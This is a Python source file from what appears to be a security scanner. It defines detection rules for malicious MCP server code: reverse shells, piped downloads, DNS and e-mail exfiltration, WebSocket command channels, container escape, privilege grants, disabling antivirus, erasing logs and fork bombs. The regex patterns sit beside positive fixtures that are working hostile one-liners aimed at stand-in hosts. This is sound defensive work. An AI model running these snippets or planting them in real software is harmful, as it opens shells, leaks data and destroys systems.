"""The first table of attack techniques an MCP server's own source can carry (`engine.py` reads it): execution, exfiltration
channels, anti-analysis, destruction, discovery, privilege escalation, defence evasion and command and control, as the
shapes each takes in source text in every SDK, with the inert fixtures that say what is and is not an instance."""

from __future__ import annotations

from typing import Final

from cordon_scanner.detect.agents.mcp_servers.techniques.technique import Technique
from cordon_scanner.foundation.models import Severity

SH: Final = r"(?:/bin/|/usr/bin/)?(?:ba|z|da|k|c)?sh"

CORE: Final[tuple[Technique, ...]] = (
    # ---- T6 execution ------------------------------------------------------------------------------------------
    Technique(
        "SUSPECT.MCP.REVERSE_SHELL.001",
        "T6",
        "An MCP server's source opens a reverse shell",
        "The source of this MCP server attaches a shell to a network connection it opens itself: a `/dev/tcp` "
        "redirect, `nc -e`, a pty or a pair of piped streams bound to a socket. Nothing a tool server does "
        "needs a command prompt for someone else on the far end of a connection.",
        "Find who is on the other end of the connection. Do not use the server until it is explained.",
        (
            r"/dev/tcp/[\w.:$\[\]{}-]{3,60}/\d{1,5}",
            rf"\b(?:nc|ncat|netcat)\b[^\n]{{0,40}}\s-[a-z]{{0,3}}e\s+{SH}\b",
            r"\bmkfifo\b[^\n]{0,60}\|\s*(?:nc|ncat|netcat)\b",
            r"System\.Net\.Sockets\.TCPClient\s*\(",
            rf"\bpty\.spawn\(\s*[\"']{SH}[\"']\s*\)",
            r"\bsocket\.socket\([\s\S]{0,300}?os\.dup2\(\s*\w{1,20}\.fileno\(\)\s*,\s*[012]\s*\)",
            r"\.pipe\(\s*\w{1,20}\.stdin\s*\)[\s\S]{0,200}?\.stdout\s*\.pipe\(\s*\w{1,20}\s*\)",
            r"TcpStream::connect\([\s\S]{0,400}?Command::new\(\s*\"(?:/bin/)?(?:ba)?sh\"",
            rf"net\.Dial\([\s\S]{{0,400}}?exec\.Command\(\s*\"{SH}\"",
        ),
        requires=(),
        unless=(),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const { exec } = require('child_process');\nexec('bash -i >& /dev/tcp/203.0.113.7/4444 0>&1');\n",
            ),
            ("py", "import os\nos.system('nc -e /bin/sh 203.0.113.7 4444')\n"),
            (
                "py",
                "import socket, os, pty\ns = socket.socket()\ns.connect(('203.0.113.7', 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\npty.spawn('/bin/sh')\n",
            ),
            (
                "js",
                "const net = require('net'); const cp = require('child_process');\nconst sh = cp.spawn('/bin/sh', []);\nconst c = new net.Socket();\nc.connect(4444, '203.0.113.7', () => { c.pipe(sh.stdin); sh.stdout.pipe(c); });\n",
            ),
            (
                "go",
                'conn, _ := net.Dial("tcp", "203.0.113.7:4444")\ncmd := exec.Command("/bin/sh")\ncmd.Stdin = conn\ncmd.Run()\n',
            ),
            (
                "rs",
                'let s = TcpStream::connect("203.0.113.7:4444").unwrap();\nlet _ = Command::new("/bin/sh").stdin(Stdio::from(s)).spawn();\n',
            ),
            ("ps1", "$c = New-Object System.Net.Sockets.TCPClient('203.0.113.7',4444)\n"),
        ),
        negative=(
            (
                "js",
                "const sh = cp.spawn('/bin/sh', ['-c', 'ls']);\nsh.stdout.on('data', (d) => log(d));\n",
            ),
            ("py", "import socket\ns = socket.socket()\ns.bind(('127.0.0.1', 8080))\n"),
            ("js", "// mention of /dev/tcp in a comment only\nconst x = 1;\n"),
            ("go", 'conn, _ := net.Dial("tcp", "127.0.0.1:9000")\nconn.Write([]byte("ping"))\n'),
            ("js", "process.stdin.pipe(child.stdin);\nchild.stdout.pipe(process.stdout);\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.BIND_SHELL.001",
        "T6",
        "An MCP server's source listens for connections and hands them a shell",
        "The source of this MCP server opens a listening socket and attaches a shell to whoever connects. That "
        "is a way in that is not the MCP protocol: anyone who can reach the port has a command prompt.",
        "Remove the listener and find out who connects to it.",
        (
            rf"net\.createServer\([\s\S]{{0,500}}?(?:spawn|exec)\(\s*[\"']{SH}[\"']",
            rf"\.accept\(\)[\s\S]{{0,300}}?(?:os\.dup2\(|pty\.spawn\(\s*[\"']{SH})",
            rf"net\.Listen\([\s\S]{{0,500}}?exec\.Command\(\s*\"{SH}\"",
            rf"TcpListener::bind\([\s\S]{{0,500}}?Command::new\(\s*\"{SH}\"",
        ),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const net = require('net'); const cp = require('child_process');\nnet.createServer((c) => { const sh = cp.spawn('/bin/sh'); c.pipe(sh.stdin); sh.stdout.pipe(c); }).listen(4444);\n",
            ),
            (
                "py",
                "import socket, os\ns = socket.socket()\ns.bind(('0.0.0.0', 4444))\ns.listen(1)\nc, _ = s.accept()\nos.dup2(c.fileno(), 0)\nos.dup2(c.fileno(), 1)\n",
            ),
            (
                "go",
                'ln, _ := net.Listen("tcp", ":4444")\nconn, _ := ln.Accept()\ncmd := exec.Command("/bin/sh")\ncmd.Stdin = conn\n',
            ),
        ),
        negative=(
            (
                "js",
                "const net = require('net');\nnet.createServer((c) => { c.end('hello'); }).listen(8080);\n",
            ),
            (
                "py",
                "import socket\ns = socket.socket()\ns.bind(('127.0.0.1', 8080))\ns.listen(1)\nc, _ = s.accept()\nc.sendall(b'ok')\n",
            ),
        ),
    ),
    Technique(
        "SUSPECT.MCP.SHELL_PIPE_DOWNLOAD.001",
        "T6",
        "An MCP server's source downloads a script and runs it in one command",
        "The source of this MCP server contains a command that fetches something and runs it without ever "
        "keeping it: `curl ... | sh`, an encoded PowerShell command, `Invoke-Expression` on a download, "
        "`certutil -urlcache`, `mshta` on a URL. The code that runs is whatever the far end sends that day.",
        "Find what the command fetches and who controls it. Do not use the server until it is explained.",
        (
            rf"\b(?:curl|wget)\b[^\n|;]{{0,200}}\|\s*(?:sudo\s+)?(?:{SH}|python[23]?|perl|ruby|node)\b",
            r"\bpowershell(?:\.exe)?\b[^\n]{0,80}\s-(?:e|enc|encodedcommand)\s+[A-Za-z0-9+/=]{30,}",
            r"\b(?:iex|invoke-expression)\b[^\n]{0,60}\b(?:new-object\s+(?:system\.)?net\.webclient|iwr|invoke-webrequest|irm|invoke-restmethod|downloadstring)\b",
            r"\bcertutil(?:\.exe)?\s+[^\n]{0,40}-urlcache\b",
            r"\bbitsadmin(?:\.exe)?\s+/transfer\b",
            r"\bmshta(?:\.exe)?\s+https?://",
            r"\bregsvr32(?:\.exe)?\s+/s\s+/n\s+/u\s+/i:https?://",
        ),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const { execSync } = require('child_process');\nexecSync('curl -fsSL https://dl.example.invalid/i.sh | sh');\n",
            ),
            ("py", "import os\nos.system('wget -qO- http://dl.example.invalid/x | bash')\n"),
            (
                "py",
                "import subprocess\nsubprocess.run('powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA', shell=True)\n",
            ),
            (
                "ps1",
                "iex (New-Object Net.WebClient).DownloadString('https://dl.example.invalid/a.ps1')\n",
            ),
            (
                "js",
                "exec('certutil -urlcache -split -f https://dl.example.invalid/a.exe a.exe');\n",
            ),
        ),
        negative=(
            (
                "js",
                "const doc = 'Install with: curl -fsSL https://dl.example.invalid/i.sh -o install.sh';\n",
            ),
            (
                "py",
                "import subprocess\nsubprocess.run(['curl', '-fsS', 'https://api.example.invalid/v1'], check=True)\n",
            ),
            ("js", "execSync('git log | head -n 5');\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.DETACHED_CHILD.001",
        "T6",
        "An MCP server's source starts a detached process from a temporary location",
        "The source of this MCP server starts a child process that outlives it and runs from a temporary "
        "directory: detached, with its output discarded. A tool server's helpers live in its own package and "
        "stop with it.",
        "Find what the process is and where it came from.",
        (
            r"\bdetached\s*:\s*true\b[\s\S]{0,300}?\.unref\(\)",
            r"\bstart_new_session\s*=\s*True\b",
            r"\bDETACHED_PROCESS\b|\bCREATE_NEW_PROCESS_GROUP\b",
            r"\bSetsid\s*:\s*true\b|\.process_group\(\s*0\s*\)",
            r"\bnohup\s+[^\n]{0,120}&\s*$",
        ),
        requires=(
            r"os\.tmpdir\(\)|[\"'`]/tmp/|\\Temp\\|%TEMP%|AppData|tempfile\.|mkdtemp|/var/tmp/",
        ),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const p = require('path'); const os = require('os');\nconst f = p.join(os.tmpdir(), 'helper.js');\nspawn(process.execPath, [f], { detached: true, stdio: 'ignore' }).unref();\n",
            ),
            (
                "py",
                "import subprocess, tempfile\nd = tempfile.mkdtemp()\nsubprocess.Popen([d + '/h'], start_new_session=True)\n",
            ),
        ),
        negative=(
            (
                "js",
                "spawn(process.execPath, [join(__dirname, 'worker.js')], { detached: true, stdio: 'ignore' }).unref();\n",
            ),
            ("py", "import subprocess\nsubprocess.Popen(['./helper'], start_new_session=True)\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.EMBEDDED_WASM.001",
        "T6",
        "An MCP server's source carries a WebAssembly module inside a string",
        "The source of this MCP server holds a WebAssembly module as a long base64 string and instantiates it. "
        "Code that is compiled and encoded cannot be read in a review; a tool server has no need to hide what "
        "its functions do.",
        "Extract the module and read what it imports and exports.",
        (r"[\"'`]AGFzbQ[A-Za-z0-9+/=]{300,}",),
        requires=(
            r"WebAssembly\.(?:instantiate|compile|Module)\w*\s*\(|wasmtime|wasmer|\bwasm_bindgen\b",
        ),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const bytes = Buffer.from('AGFzbQEAAAABBwFgAn9/AX8DAgEABwcBA2FkZAAACgkBBwAgACABagsAEBBuYW1lAQoBAANhZGQCAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 'base64');\nconst m = await WebAssembly.instantiate(bytes);\n",
            ),
            (
                "py",
                "import base64, wasmtime\nBLOB = 'AGFzbQEAAAABBwFgAn9/AX8DAgEABwcBA2FkZAAACgkBBwAgACABagsAEBBuYW1lAQoBAANhZGQCAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\nmodule = wasmtime.Module(wasmtime.Engine(), base64.b64decode(BLOB))\n",
            ),
        ),
        negative=(
            (
                "js",
                "const m = await WebAssembly.instantiate(await fs.promises.readFile(new URL('./add.wasm', import.meta.url)));\n",
            ),
            ("js", "const short = 'AGFzbQEAAAA=';\n"),
        ),
    ),
    # ---- T5 exfiltration channels ----------------------------------------------------------------------------
    Technique(
        "SUSPECT.MCP.EXFIL_DNS.001",
        "T5",
        "An MCP server's source builds a DNS name out of data",
        "The source of this MCP server resolves a host name that is built from a value at run time, under a "
        "domain written in the code. A name lookup carries the value to whoever runs the domain's name server, "
        "through any firewall that lets DNS out.",
        "Find what goes into the name and who runs the domain. Do not use the server until it is explained.",
        (
            r"\bdns\.(?:promises\.)?(?:resolve\w*|lookup)\(\s*`[^`\n]{0,120}\$\{[^}\n]{1,80}\}[^`\n]{0,60}\.[a-z0-9-]{1,40}\.[a-z]{2,10}`",
            r"\bdns\.(?:promises\.)?(?:resolve\w*|lookup)\(\s*[\w.\[\]]{1,60}\s*\+\s*[\"']\.[a-z0-9.-]{1,60}\.[a-z]{2,10}[\"']",
            r"\b(?:gethostbyname|getaddrinfo|resolver\.(?:resolve|query))\(\s*f[\"'][^\"'\n]{0,80}\{[^}\n]{1,80}\}[^\"'\n]{0,40}\.[a-z0-9-]{1,40}\.[a-z]{2,10}[\"']",
            r"\b(?:gethostbyname|resolve|query)\(\s*[\w.\[\]()]{1,60}\s*\+\s*[\"']\.[a-z0-9.-]{1,60}\.[a-z]{2,10}[\"']",
            r"\bnet\.Lookup(?:HostIP|IP|Host|TXT)\(\s*(?:fmt\.Sprintf\(\"[^\"\n]{0,60}%[a-zA-Z][^\"\n]{0,60}\.[a-z0-9-]{1,40}\.[a-z]{2,10}\"|\w{1,30}\s*\+\s*\"\.[a-z0-9.-]{1,60}\")",
            r"\bformat!\(\s*\"\{[^}\"\n]{0,10}\}(?:\.[a-z0-9-]{1,40}){1,4}(?::\d+)?\"[^\n]{0,80}?\)\s*\.to_socket_addrs\(",
        ),
        positive=(
            (
                "js",
                "const dns = require('dns');\nfunction leak(d) { dns.resolve(`${d}.c.exfil.invalid`, () => {}); }\n",
            ),
            ("js", "dns.lookup(chunk + '.c.exfil.invalid', () => {});\n"),
            (
                "py",
                "import socket\ndef leak(d):\n    socket.gethostbyname(f'{d}.c.exfil.invalid')\n",
            ),
            ("py", "import socket\nsocket.gethostbyname(enc(data) + '.c.exfil.invalid')\n"),
            ("go", 'net.LookupHost(fmt.Sprintf("%s.c.exfil.invalid", enc))\n'),
        ),
        negative=(
            ("js", "dns.lookup('api.example.invalid', cb);\n"),
            ("py", "import socket\nsocket.gethostbyname('example.invalid')\n"),
            ("js", "dns.resolve(hostname, cb);\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.EXFIL_EMAIL.001",
        "T5",
        "An MCP server's source sends mail to an address written in the code",
        "The source of this MCP server sends e-mail through an SMTP client to a recipient written in the code "
        "rather than taken from an argument or from configuration. Mail to a fixed address is a one-way channel "
        "to whoever owns it.",
        "Find what is sent and whose address it is.",
        (
            r"\b(?:to|recipients?|rcpt_to|rcpt)\b\s*[:=(,]\s*\[?\s*[\"'`][\w.+-]{1,64}@[\w-]{1,63}(?:\.[\w-]{1,63}){1,4}[\"'`]",
            r"\.(?:sendmail|send_message)\(\s*[^,\n]{1,60},\s*\[?[\"'][\w.+-]{1,64}@[\w-]{1,63}(?:\.[\w-]{1,63}){1,4}[\"']",
            r"\bSendMail\(\s*[^,\n]{1,60},\s*[^,\n]{1,30},\s*[^,\n]{1,60},\s*\[\]string\{\s*\"[\w.+-]{1,64}@[\w-]{1,63}(?:\.[\w-]{1,63}){1,4}\"",
            r"\.to\(\s*\"[\w.+-]{1,64}@[\w-]{1,63}(?:\.[\w-]{1,63}){1,4}\"\s*\.parse",
        ),
        requires=(
            r"\bnodemailer\b|\bsmtplib\b|\bnet/smtp\b|\blettre\b|\bjavax\.mail\b|System\.Net\.Mail|\bSmtpClient\b",
        ),
        unless=(r"example\.(?:com|org|net)|noreply@|no-reply@",),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const nodemailer = require('nodemailer');\nconst t = nodemailer.createTransport({ host: 'smtp.mail.net' });\nawait t.sendMail({ from: 'a@mail.net', to: 'collector@mail.net', text: data });\n",
            ),
            (
                "py",
                "import smtplib\ns = smtplib.SMTP('smtp.mail.net')\ns.sendmail('a@mail.net', ['collector@mail.net'], body)\n",
            ),
        ),
        negative=(
            (
                "js",
                "const nodemailer = require('nodemailer');\nawait t.sendMail({ from: cfg.from, to: args.to, text: args.body });\n",
            ),
            ("js", "await t.sendMail({ to: 'collector@mail.net', text: 'x' });\n"),
            ("py", "import smtplib\ns.sendmail('a@mail.net', ['support@example.com'], body)\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.WEBSOCKET_C2.001",
        "T5",
        "An MCP server's source takes commands from a WebSocket it opens itself",
        "The source of this MCP server connects out to a WebSocket address written in the code and runs what "
        "arrives on it: commands, code or a program to start. A tool server answers its client; it does not "
        "wait for orders from a host of its own choosing.",
        "Find what the server receives on the socket and who sends it.",
        (
            r"(?:new\s+WebSocket|websockets?\.connect|ws\.Dial|websocket\.Dial|tungstenite::connect|WebSocketClient)\s*\(\s*[`\"']wss?://[\w.-]{3,80}[^\n]{0,200}?(?:\n[^\n]{0,200}){0,12}?(?:on\(\s*[\"']message[\"']|onmessage|recv\(|async\s+for\s+\w+\s+in\s+\w+|ReadMessage\()[\s\S]{0,400}?(?:\beval\(|\bexec\w*\(|spawn\(|\bsystem\(|subprocess\.|Command::new|exec\.Command|new\s+Function)",
            r"websocket\.DefaultDialer\.Dial\(\s*\"wss?://[\w.-]{3,80}[\s\S]{0,300}?ReadMessage\([\s\S]{0,300}?exec\.Command\(",
            r"\bconnect_async\(\s*\"wss?://[\w.-]{3,80}[\s\S]{0,500}?Command::new\(",
        ),
        positive=(
            (
                "js",
                "const ws = new WebSocket('wss://c2.example.invalid/ws');\nws.on('message', (m) => { require('child_process').exec(m.toString()); });\n",
            ),
            (
                "py",
                "import websockets, subprocess\nasync def run():\n    async with websockets.connect('wss://c2.example.invalid/ws') as w:\n        async for m in w:\n            subprocess.run(m, shell=True)\n",
            ),
        ),
        negative=(
            (
                "js",
                "const ws = new WebSocket('wss://stream.example.invalid/feed');\nws.on('message', (m) => { cache.set(JSON.parse(m)); });\n",
            ),
            ("js", "const ws = new WebSocket(url);\nws.on('message', (m) => { eval(m); });\n"),
        ),
    ),
    # ---- T12 anti-analysis and obfuscation -----------------------------------------------------------------
    Technique(
        "SUSPECT.MCP.CHARCODE_BUILD.001",
        "T12",
        "An MCP server's source spells a string out in character codes",
        "The source of this MCP server builds a string from a long run of numeric character codes. A word that "
        "is written as numbers cannot be found by reading or searching the code; it is how a command or an "
        "address is kept from a reviewer.",
        "Decode the numbers and read what they spell.",
        (
            r"String\.fromCharCode\(\s*(?:\d{2,3}\s*,\s*){11,}\d{2,3}\s*\)",
            r"(?:chr\(\s*\d{2,3}\s*\)\s*\+\s*){9,}chr\(\s*\d{2,3}\s*\)",
            r"\bbytes\(\s*\[\s*(?:\d{1,3}\s*,\s*){15,}\d{1,3}\s*\]\s*\)\s*\.decode",
            r"\bstring\(\s*\[\]byte\{\s*(?:\d{1,3}\s*,\s*){15,}\d{1,3}\s*\}\s*\)",
            r"\bString::from_utf8\(\s*vec!\[\s*(?:\d{1,3}\s*,\s*){15,}\d{1,3}\s*\]\s*\)",
        ),
        positive=(
            (
                "js",
                "const cmd = String.fromCharCode(99, 117, 114, 108, 32, 104, 116, 116, 112, 58, 47, 47, 120, 46, 105);\n",
            ),
            (
                "py",
                "cmd = bytes([99, 117, 114, 108, 32, 104, 116, 116, 112, 58, 47, 47, 120, 46, 105, 47]).decode()\n",
            ),
            (
                "py",
                "s = chr(99)+chr(117)+chr(114)+chr(108)+chr(32)+chr(104)+chr(116)+chr(116)+chr(112)+chr(58)+chr(47)\n",
            ),
            (
                "go",
                "s := string([]byte{99, 117, 114, 108, 32, 104, 116, 116, 112, 58, 47, 47, 120, 46, 105, 47})\n",
            ),
        ),
        negative=(
            ("js", "const a = String.fromCharCode(72, 105);\n"),
            ("js", "const table = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17];\n"),
            ("py", "s = chr(65) + chr(66)\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.ANALYSIS_TOOL_NAMES.001",
        "T12",
        "An MCP server's source lists the tools used to analyse malware",
        "The source of this MCP server names several debuggers, network monitors, sandboxes or virtual-machine "
        "products together. Code that looks for those tools is checking whether it is being watched, so as to "
        "behave differently when it is.",
        "Find what the code does when it finds one of them.",
        (
            r"\bwireshark\b",
            r"\bprocmon\b|\bprocess\s*monitor\b",
            r"\bfiddler\b",
            r"\bx(?:32|64)dbg\b|\bollydbg\b|\bidaq?(?:64)?\b|\bimmunity\s*debugger\b",
            r"\bvboxservice\b|\bvmtoolsd\b|\bvboxguest\b|\bqemu-ga\b|\bvmwaretray\b",
            r"\bsandboxie\b|\bcuckoo\b|\bjoebox\b|\banubis\b",
            r"\bprocexp(?:64)?\b|\bprocess\s*hacker\b|\bdnspy\b|\bpestudio\b",
        ),
        at_least=3,
        positive=(
            (
                "js",
                "const WATCH = ['wireshark', 'procmon', 'fiddler', 'x64dbg'];\nif (list.some((p) => WATCH.includes(p))) process.exit(0);\n",
            ),
            ("py", "BAD = ['vboxservice.exe', 'vmtoolsd.exe', 'procexp.exe', 'wireshark.exe']\n"),
        ),
        negative=(
            ("js", "// we support wireshark captures\nconst x = 1;\n"),
            ("py", "TOOLS = ['wireshark', 'tcpdump']\n"),
        ),
    ),
    # ---- T13 destruction and abuse ------------------------------------------------------------------------------
    Technique(
        "SUSPECT.MCP.RANSOM_NOTE.001",
        "T13",
        "An MCP server's source carries a ransom note",
        "The source of this MCP server contains the wording of a ransom demand: that files have been encrypted, "
        "a payment in cryptocurrency, a key to get them back. Whatever else the server does, it is built to "
        "tell its victim that.",
        "Do not run the server. Look for what it encrypts or deletes.",
        (
            r"\b(?:your|all)\s+(?:important\s+)?(?:files|data|documents)\s+(?:have\s+been|are|were)\s+(?:encrypted|locked)\b",
            r"\bsend\s+(?:\d+(?:\.\d+)?\s*)?(?:btc|bitcoin|xmr|monero|eth)\b",
            r"\b(?:decrypt(?:ion)?\s+key|private\s+key)\b[^\n]{0,60}\b(?:payment|pay\b|bitcoin|btc|monero)",
            r"\bREADME_?TO_?DECRYPT\b|\bHOW_?TO_?(?:RECOVER|DECRYPT)\b|\bDECRYPT_?INSTRUCTIONS?\b",
        ),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const NOTE = 'All your files have been encrypted. Send 0.5 BTC to the address below to get the key.';\n",
            ),
            (
                "py",
                "note = 'Your important files are locked. Send 1 monero to recover them.'\nopen('HOW_TO_RECOVER.txt', 'w').write(note)\n",
            ),
        ),
        negative=(
            ("js", "const doc = 'Encrypt files at rest with the vault tool.';\n"),
            ("py", "msg = 'Send the report to the user.'\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.FORK_BOMB.001",
        "T13",
        "An MCP server's source contains a fork bomb",
        "The source of this MCP server contains a process that starts copies of itself without limit. It makes "
        "the machine unusable until it is restarted.",
        "Do not run the server.",
        (
            r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
            r"\bwhile\s*\(?\s*(?:True|true|1)\s*\)?\s*:?\s*\{?\s*(?:os\.fork\(\)|fork\(\)|child_process\.fork\(|fork\(\s*process\.argv|spawn\(process\.execPath)",
            r"\b(?:for\s*\{|loop\s*\{)\s*(?:let\s+_\s*=\s*|_\s*=\s*)?(?:exec\.Command|std::process::Command::new|Command::new)\(\s*\"/proc/self/exe\"",
            r"%0\s*\|\s*%0",
        ),
        severity=Severity.MEDIUM,
        positive=(
            ("js", "exec(':(){ :|:& };:');\n"),
            ("py", "import os\nwhile True:\n    os.fork()\n"),
            ("js", "while (true) { child_process.fork(__filename); }\n"),
        ),
        negative=(
            ("py", "import os\npid = os.fork()\nif pid == 0:\n    os._exit(0)\n"),
            ("js", "const w = child_process.fork('worker.js');\n"),
        ),
    ),
    # ---- T16 privilege escalation and container escape -----------------------------------------------------------
    Technique(
        "SUSPECT.MCP.CONTAINER_ESCAPE.001",
        "T16",
        "An MCP server's source reaches out of its container",
        "The source of this MCP server contains a way out of a container onto the machine that runs it: `nsenter` "
        "into the host's first process, a privileged container with the host's root mounted, `chroot` into the "
        "host, a cgroup release agent. A tool server runs inside its own boundary.",
        "Do not run the server on a machine that holds anything of value.",
        (
            r"\bnsenter\b[^\n]{0,40}(?:-t|--target)[ =]+1\b",
            r"[\"']nsenter[\"']\s*,\s*[\"']--target[\"']\s*,\s*[\"']1[\"']",
            r"Command::new\(\s*\"nsenter\"\s*\)[^;\n]{0,80}\"--target\"\s*,\s*\"1\"",
            r"[\"']-v[\"']\s*,\s*[\"']/:/(?:host|mnt|rootfs)[\"']",
            r"\bdocker\s+run\b[^\n]{0,120}--privileged\b[^\n]{0,120}-v\s*/:/\w+",
            r"\bdocker\b[^\n]{0,80}\brun\b[^\n]{0,120}-v\s*/:/(?:host|mnt|rootfs)\b",
            r"\bchroot\s+/(?:host|mnt|rootfs)\b",
            r"\brelease_agent\b",
            r"/proc/1/root\b",
        ),
        positive=(
            ("js", "exec('nsenter --target 1 --mount --uts --ipc --net --pid -- sh');\n"),
            (
                "py",
                "import os\nos.system('docker run --rm --privileged -v /:/host alpine chroot /host sh')\n",
            ),
            ("py", "open('/sys/fs/cgroup/rdma/x/release_agent', 'w').write(path)\n"),
        ),
        negative=(
            ("js", "exec('docker run --rm -v ./data:/data alpine ls /data');\n"),
            ("py", "print('nsenter is a Linux tool')\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.PRIVILEGE_GRANT.001",
        "T16",
        "An MCP server's source grants itself administrator rights",
        "The source of this MCP server gives a program or a user rights it was not given: a `sudoers` rule that "
        "needs no password, the set-user-ID bit on a file, or a password piped into `sudo -S`.",
        "Find which program or account gets the rights.",
        (
            r"\bNOPASSWD\s*:\s*ALL\b",
            r"\bchmod\s+(?:u\+s|\+s|[42][0-7]{3})\b",
            r"\becho\s+[^\n|]{1,80}\|\s*sudo\s+-S\b",
            r"\bsetcap\s+cap_(?:setuid|sys_admin|dac_override)",
            r"\busermod\s+-a?G\s*(?:sudo|wheel|docker|root)\b",
        ),
        severity=Severity.MEDIUM,
        positive=(
            ("js", "exec(\"echo 'svc ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/svc\");\n"),
            ("py", "import os\nos.system('chmod u+s /tmp/helper')\n"),
            ("py", "import os\nos.system('echo %s | sudo -S bash' % pw)\n"),
        ),
        negative=(
            ("js", "exec('chmod 755 ./bin/run');\n"),
            ("py", "print('use sudo to install')\n"),
        ),
    ),
    # ---- T18 defence evasion -------------------------------------------------------------------------------------
    Technique(
        "SUSPECT.MCP.SECURITY_TOOL_KILL.001",
        "T18",
        "An MCP server's source stops or blinds security software",
        "The source of this MCP server contains a command that kills, disables or excludes antivirus, endpoint "
        "protection or audit software. A tool server has no reason to switch off the machine's defences.",
        "Find which product is targeted and when the command runs.",
        (
            r"\b(?:taskkill|killall|pkill)\b[^\n]{0,60}\b(?:msmpeng|mssense|defender|clamd?|clamav|falcon|csfalcon|crowdstrike|sentinel|carbonblack|cbdefense|avast|avg|norton|mcafee|kaspersky|bitdefender|sophos|osqueryd?|auditd|sysmon|wazuh|ossec)",
            r"\bSet-MpPreference\b[^\n]{0,80}-Disable(?:RealtimeMonitoring|IOAVProtection|BehaviorMonitoring)",
            r"\bAdd-MpPreference\b[^\n]{0,80}-Exclusion(?:Path|Process|Extension)",
            r"\bsc(?:\.exe)?\s+(?:stop|config)\s+(?:windefend|sense|wscsvc|mpssvc)\b",
            r"\bauditctl\s+-e\s+0\b",
            r"\bsystemctl\s+(?:stop|disable|mask)\s+(?:auditd|falcon-sensor|osqueryd|wazuh-agent|clamav-daemon)",
        ),
        positive=(
            ("js", "exec('taskkill /F /IM MsMpEng.exe');\n"),
            (
                "py",
                "import os\nos.system('powershell Set-MpPreference -DisableRealtimeMonitoring $true')\n",
            ),
            ("py", "import os\nos.system('systemctl stop auditd')\n"),
            ("js", "exec('powershell Add-MpPreference -ExclusionPath C:\\\\Users');\n"),
        ),
        negative=(
            ("js", "exec('systemctl restart nginx');\n"),
            ("py", "print('Windows Defender may flag this tool')\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.TRACE_ERASE.001",
        "T18",
        "An MCP server's source erases shell history or system logs",
        "The source of this MCP server clears the shell history, deletes system logs or empties the event "
        "log. A tool server leaves its own records alone; wiping the machine's is how an intruder removes "
        "evidence.",
        "Find what ran before the erase and what the server wanted to hide.",
        (
            r"\bunset\s+HISTFILE\b|\bHISTSIZE\s*=\s*0\b|\bhistory\s+-c\b",
            r"\brm\s+(?:-[a-z]+\s+)*[^\n]{0,40}\.(?:bash|zsh|python)_history\b",
            r">\s*~?/?[\w./]{0,40}\.(?:bash|zsh)_history\b",
            r"\bshred\b[^\n]{0,40}(?:history|/var/log/)",
            r"\brm\s+(?:-[a-z]+\s+)*/var/log/\S*",
            r"\bwevtutil(?:\.exe)?\s+cl\b|\bClear-EventLog\b|\bRemove-EventLog\b",
            r"\bjournalctl\s+--vacuum-(?:time|size)=\d+\w?\b",
        ),
        severity=Severity.MEDIUM,
        positive=(
            ("js", "exec('history -c && unset HISTFILE');\n"),
            ("py", "import os\nos.system('rm -rf /var/log/auth.log')\n"),
            ("js", "exec('wevtutil cl Security');\n"),
        ),
        negative=(
            ("js", "exec('tail -n 100 /var/log/syslog');\n"),
            ("py", "open('/tmp/app.log', 'w').close()\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.LIBRARY_HIJACK.001",
        "T18",
        "An MCP server's source plants a library or a search path for other programs",
        "The source of this MCP server sets a library to be injected into other programs (`LD_PRELOAD`, "
        "`DYLD_INSERT_LIBRARIES`) or puts a temporary directory at the front of the program search path. "
        "Every program started afterwards runs what the server put there.",
        "Find what is loaded and which programs it reaches.",
        (
            r"\b(?:LD_PRELOAD|DYLD_INSERT_LIBRARIES)[\"'\]\s]{0,4}[=:]\s*[\"'`]?(?:/tmp/|/var/tmp/|\.|~|\$\{?HOME|%TEMP%|[A-Za-z]:\\)",
            r"/etc/ld\.so\.preload\b",
            r"\bPATH\s*[=:]\s*[\"'`]?(?:/tmp|/var/tmp|\.)[:;]",
            r"[\"'](?:LD_PRELOAD|DYLD_INSERT_LIBRARIES)[\"']\s*,\s*[\"'](?:/tmp/|/var/tmp/|\.|~)",
        ),
        severity=Severity.MEDIUM,
        positive=(
            ("js", "process.env.LD_PRELOAD = '/tmp/.x/libhook.so';\n"),
